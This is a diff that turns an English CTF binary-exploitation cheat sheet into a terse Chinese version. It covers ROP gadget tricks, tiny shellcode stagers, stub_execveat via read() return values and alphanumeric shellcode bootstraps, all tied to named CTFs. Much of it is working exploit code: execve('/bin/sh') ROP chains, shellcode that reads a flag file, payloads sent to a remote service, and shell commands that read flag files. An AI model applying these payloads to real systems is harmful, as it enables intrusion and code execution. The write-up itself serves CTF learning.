-**When to use:** Need `rdx = 0` for `execve(path, argv, NULL)` but no `pop rdx; ret` gadget exists in the binary. The canary verification epilogue `xor rdx, fs:28h` zeros RDX when the canary is intact.
+shellcode 必须正好一个 AES 块且被解密后执行时，反推 IV：
 
 ```python
-from pwn import *
-
-# Canary check epilogue (found in most binaries):
-# mov rdx, [rsp+8]    ; load canary from stack
-# xor rdx, fs:28h     ; XOR with stored canary → 0 if intact
-# Jump into this code as a "gadget" to zero RDX
-
-# Find the canary check sequence in the binary
-canary_xor_gadget = next(binary.search(asm(
-    "mov rdx, [rsp+8]; xor rdx, qword ptr fs:[0x28]"
-)))
-# Side effect: harmless write of je result, rdx = 0 for execve(path, argv, NULL)
-
-# Use in ROP chain:
-rop = flat(
-    pop_rdi, binsh_addr,          # rdi = "/bin/sh"
-    pop_rsi, 0,                   # rsi = NULL (argv)
-    canary_xor_gadget,            # rdx = canary ^ fs:28h = 0
-    execve_addr,                  # execve("/bin/sh", NULL, NULL)
-)
+crafted_iv = AES_decrypt(known_ciphertext_block) ^ shellcode
 ```
 
-**Key insight:** The stack canary check `xor rdx, fs:28h` produces `rdx=0` when the canary is correct. Jump into this epilogue as a gadget when `pop rdx` is unavailable -- it provides a reliable zero-rdx primitive with only a benign byte-write side effect. This works because the canary on the stack matches `fs:28h`, so the XOR result is always zero in a non-corrupted frame.
+因为 CBC 首块解密后异或 IV，所以把「期望的明文」与「解出来的中间值」异或即得 IV。
 
-**When to recognize:** ROP chain needs `rdx=0` (common for `execve` third argument) but the binary lacks `pop rdx; ret` or `pop rdx; pop rbx; ret`. Search for `xor rdx, qword ptr fs:` in the binary's disassembly -- it appears in every function with a stack canary.
+### 8.3 先审入口寄存器
 
-**References:** VolgaCTF 2017
+写 shellcode 前先在 gdb 里 `b *shellcode_entry` + `info registers`。已就绪的 `eax`（syscall 号）、`ebx`（fd）、`rsp`（可写区）都能直接省掉：
 
----
-
-## Minimal Shellcode with Pre-Initialized Registers (Square CTF 2017)
-
-**Pattern:** When the shellcode entry point has registers already initialized to useful values (e.g., `eax=4` for the `write` syscall on x86-32, `ebx=1` for stdout), exploit them to dramatically reduce shellcode size. Always audit register state at entry before writing shellcode from scratch.
-
-**Example (x86-32 write syscall, entry: eax=4, ebx=1):**
 ```asm
-; Entry state: eax=4 (sys_write), ebx=1 (stdout fd)
-; Goal: write flag buffer to stdout — only need ecx and edx
-
-; 3-byte: point ecx at the flag buffer
-lea ecx, [edi + flag_offset]   ; 3 bytes (if offset fits in 1 byte)
-
-; 2-byte: set edx (byte count)
-mov dl, 64                      ; 2 bytes
-
-; 2-byte: trigger syscall
-int 0x80                        ; 2 bytes
-
-; Total: 7 bytes — or as few as 5 if edx is already set
+; 入口 eax=4 (write), ebx=1 (stdout)，只缺 ecx/edx
+lea ecx, [edi + flag_offset]   ; 3
+mov dl, 64                     ; 2
+int 0x80                       ; 2   → 共 7 字节，edx 已就绪时 5 字节
 ```
 
-**Workflow:**
-```python
-# 1. Run the binary in gdb, break right before shellcode is executed
-# 2. Inspect all registers: info registers
-# 3. Identify which syscall arguments are already set
-# 4. Write only the instructions needed to fill missing arguments
+## 9. 特殊约束
 
-# Useful pre-initialized patterns:
-# - eax = syscall number already set by caller
-# - ebx = fd (stdin=0, stdout=1) from prior open/setup
-# - rdi, rsi from calling convention leakage
-# - rsp pointing into a writable region (for push-based addressing)
-```
+### 9.1 canary 尾声当 `rdx` 清零 gadget（VolgaCTF 2017）
 
-**Key insight:** Always audit entry register values before writing shellcode — pre-loaded syscall numbers and fd values can reduce shellcode to under 6 bytes. The smallest possible shellcode exploits the ABI calling convention residue left by the surrounding code.
+`execve(path, argv, NULL)` 要 `rdx=0` 但没有 `pop rdx`。每个带 canary 的函数尾声都有：
 
-**References:** Square CTF 2017
-
----
-
-## Unique-Byte Shellcode via syscall RIP to RCX (HITCON 2017)
-
-**Pattern:** x86-64 `syscall` instruction saves `RIP` (next instruction address) into `RCX` as a side effect. An 8-byte stager exploits this: execute `syscall` (which also triggers a `read` with pre-set registers), then use `rcx` (now = address of the instruction after `syscall`) as the address for reading the full shellcode to the same RWX location. All 8 bytes of the stager must be unique (no repeated bytes).
-
-**8-byte stager construction:**
 ```asm
-; Entry constraints: rax=0 (read), rdi=0 (stdin), rsi=shellcode_buf, rdx=8 (small)
-; Side effect of syscall: rcx = RIP (address of next instruction after syscall)
-
-syscall          ; 2 bytes: 0f 05 — executes read(0, shellcode_buf, 8)
-                 ;           and sets rcx = &next_instr (= shellcode_buf + 2)
-push rcx         ; 1 byte:  51 — stack = [shellcode_buf + 2]
-pop rsi          ; 1 byte:  5e — rsi = shellcode_buf + 2 (where full shellcode goes)
-xor edx, edx     ; 2 bytes: 31 d2 — clear rdx
-mov dl, 100      ; 2 bytes: b2 64 — rdx = 100 (read size for stage 2)
-; Back to syscall (loop): the push/pop sequence ends up jumping to syscall again
-; ... or arrange entry so the next syscall reads 100 bytes to rsi
+mov rdx, [rsp+8]
+xor rdx, qword ptr fs:[0x28]    ; canary 完好时结果恒为 0
 ```
 
-**Uniqueness constraint:**
-```python
-# All 8 bytes must be distinct (challenge-specific filter)
-# Candidate sequence: 0f 05 51 5e 31 d2 b2 64  — all unique
-# Verify: len(set(bytes)) == len(bytes)
-stager = bytes([0x0f, 0x05, 0x51, 0x5e, 0x31, 0xd2, 0xb2, 0x64])
-assert len(set(stager)) == len(stager)  # passes
+直接跳进这条指令当 gadget 用。副作用只是后续 `je` 的一次无害跳转。搜 `xor rdx, qword ptr fs:` 就能定位。
 
-# Stage 2: full execve shellcode sent to stdin after stager runs first syscall
-from pwn import *
-p.send(stager)
-p.send(asm(shellcraft.sh()))
-```
+### 9.2 `syscall` 把 RIP 存进 RCX（HITCON 2017）
 
-**Key insight:** x86-64 `syscall` copies RIP to RCX — weaponize this as position-independent address discovery for tiny shellcode stagers. The stager needs no hardcoded addresses: it calculates its own location via the `syscall` side effect, then uses that address as the destination for reading the full payload.
-
-**References:** HITCON CTF 2017
-
----
-
-## stub_execveat Syscall as execve Alternative (ASIS CTF 2018)
-
-**Pattern:** In a tiny binary with only `read` syscall and no `pop rax` gadget, use `stub_execveat` (syscall 0x142/322) instead of `execve` (0x3b). Since `read()` returns bytes-read in `rax`, make total input length exactly 0x142 bytes so `rax=0x142` when the syscall gadget fires.
-
-**Why this works:**
-1. The binary is tiny -- only `read` and basic gadgets, no `pop rax; ret`
-2. `execve` requires `rax=0x3b` (59), but without `pop rax` there's no way to set it
-3. `read()` returns the number of bytes read in `rax` -- this is the only rax control
-4. `stub_execveat` (syscall 322 = 0x142) accepts the same arguments as `execve` when `AT_FDCWD` is used for the directory fd
-5. Send exactly 0x142 bytes so `read()` returns 0x142, then hit `syscall`
+8 字节 stager，且每字节唯一：
 
 ```python
-from pwn import *
-
-# Binary gadgets (tiny static binary)
-xor_rdx_syscall = 0x4000ed   # xor rdx, rdx; syscall
-syscall_gadget  = 0x400101   # syscall
-
-# Build payload: /bin/sh string + padding + ROP chain
-# Total length must be exactly 0x142 bytes
-payload  = b"/bin/sh\x00"                          # rdi points here
-payload += b"B" * (0x148 - (8*4) - 8)              # padding to ROP area
-payload += p64(xor_rdx_syscall)                     # xor rdx, rdx; syscall
-payload += p64(syscall_gadget)                      # syscall (rax=0x142 from read)
-payload += b"A" * (0x142 - len(payload) - 1)        # pad to exactly 0x142 bytes
-# rax = 0x142 from read() return value = stub_execveat syscall number
-
-io = remote('target', 1337)
-io.send(payload)
-io.interactive()
+stager = bytes([0x0f,0x05, 0x51, 0x5e, 0x31,0xd2, 0xb2,0x64])
+# syscall → read(0, buf, 8)，同时 rcx = &next_instr = buf+2
+# push rcx; pop rsi   → rsi = buf+2
+# xor edx,edx; mov dl,100 → rdx = 100
+assert len(set(stager)) == len(stager)
+p.send(stager); p.send(asm(shellcraft.sh()))
 ```
 
-**Key insight:** `stub_execveat` (syscall 322/0x142) accepts the same arguments as execve when `AT_FDCWD` is used, but its higher syscall number can be reached via `read()` return value when `pop rax; ret` gadgets are unavailable. Always check if alternative syscalls with equivalent functionality have numbers reachable through return values or other implicit register control.
+不需要任何硬编码地址——`syscall` 的副作用自带自定位。
 
-**References:** ASIS CTF 2018
+### 9.3 `stub_execveat` 顶 `execve`（ASIS CTF 2018）
 
----
-
-## Alphanumeric Shellcode Bootstrap via push/pop When rax=0 (nullcon HackIM 2019)
-
-**Pattern (easy-shell):** RWX page receives attacker shellcode but every byte must be alphanumeric (`[0-9A-Za-z]`). Tools like [basic-amd64-alphanumeric-shellcode-encoder](https://github.com/veritas501/basic-amd64-alphanumeric-shellcode-encoder) emit self-decoding stubs but require `rax + padding_len == shellcode_address` at entry. When the harness enters with `rax = 0` (not anywhere near the shellcode) the encoder has nothing to land on. Prepend a tiny 3-byte non-alnum-but-accepted seed — `push r12; pop rax` — so `rax` becomes a live stack/code pointer, then call the encoder with `padding_len=3`.
+只有 `read`、没有 `pop rax` 时，`rax` 唯一的控制入口是 `read()` 的返回值。`stub_execveat` 是 syscall **322 = 0x142**，用 `AT_FDCWD` 时参数与 `execve` 完全一致：
 
 ```python
-from pwn import *
-context(arch='amd64')
-
-file_name = "flag".ljust(8, '\x00')
-sc = '''
-    mov rax, %s
-    push rax
-    mov rdi, rsp
-    mov rax, 2          /* open(rsp, 0) */
-    mov rsi, 0
-    syscall
-    mov rdi, rax
-    sub rsp, 0x20
-    mov rsi, rsp
-    mov rdx, 0x20
-    mov rax, 0          /* read(fd, rsp, 0x20) */
-    syscall
-    mov rdi, 0
-    mov rsi, rsp
-    mov rdx, 0x20
-    mov rax, 1          /* write(1, rsp, 0x20) */
-    syscall
-''' % hex(u64(file_name))
-sc = asm(sc)
-
-# push r12 (0x41 0x54) + pop rax (0x58) = 3 bytes, all happen to be alnum-safe
-bootstrap = asm("push r12; pop rax;")
-payload = bootstrap + alphanum_encoder(sc, 3)
+payload  = b"/bin/sh\x00"
+payload += b"B" * (0x148 - 8*4 - 8)
+payload += p64(xor_rdx_syscall) + p64(syscall_gadget)
+payload += b"A" * (0x142 - len(payload) - 1)   # 总长正好 0x142
+p.send(payload)
 ```
 
-**Key insight:** Alphanumeric-only decoders typically need `rax` to point at (or a fixed offset before) the payload. If the harness zeroes `rax`, seed it from *any* volatile register that already holds a valid address — `r12` is routinely `_start` on Linux, and `push r12; pop rax` happens to be `AT X` (0x41 0x54 0x58), which the encoder's input filter treats as benign. Adjust the encoder's `padding_len` argument to exactly match the prepended byte count so the decode math still lines up.
+发送字节数就是 syscall 号。任何「返回长度可控」的读操作都能这样当 `pop rax` 用。
 
-**References:** nullcon HackIM 2019 — easy-shell, writeups 13048, 13203
+### 9.4 字母数字 bootstrap（nullcon HackIM 2019）
+
+字母数字编码器输出的自解码 stub 要求入口满足 `rax + padding_len == shellcode_address`。harness 入口 `rax=0` 时它无处落脚，前面塞 3 字节：
+
+```python
+bootstrap = asm("push r12; pop rax;")   # 41 54 58 = "ATX"，恰好过字母数字过滤
+payload = bootstrap + alphanum_encoder(sc, 3)   # padding_len 必须等于 3
+```
+
+`r12` 在 Linux 上通常就是 `_start`，是现成的有效地址。**`padding_len` 必须精确等于前置字节数**，否则解码起点偏了。
+
+## 10. execve 之后的交互
+
+shell 读的是同一个 stdin，早发的命令会被前面残留的 `read()` 吃掉。
+
+```python
+p.send(payload)
+time.sleep(1)                      # 等 shell 起
+p.sendline(b'id'); time.sleep(0.5)
+p.sendline(b'cat /flag* flag* 2>/dev/null')
+```
+
+**不要用 stdin 管道喂命令**，一定显式 `sendline` + 延迟。
+
+## 11. 纪律
+
+- **先定卡点再选手法**。上面 20 行判据表就是决策树，别上来就 `ROP(elf).chain()`。
+- **gadget 不够是常态，不是异常**。缺 `pop rdx` 走 ret2csu、缺写原语走 `XLAT/STOSB`、缺 `pop rax` 走返回值——每一类都有成熟替代。
+- **两阶段永远先验证第一阶段**：泄出的 6 字节要对得上 `libc.sym['puts']` 的低 12 位（`0x?e50` 之类），对不上说明返回目标选错或解析偏了一位。
+- **报的是「哪个寄存器没设对」，不是「ROP 不工作」**。崩在 `movaps` = 对齐；崩在 `syscall` 后 = 参数；崩在 `ret` = 栈被踩。
+- **shellcode 字节数要数**，15 字节方案里每个指令都是被逼出来的，别随手加 `xor`。
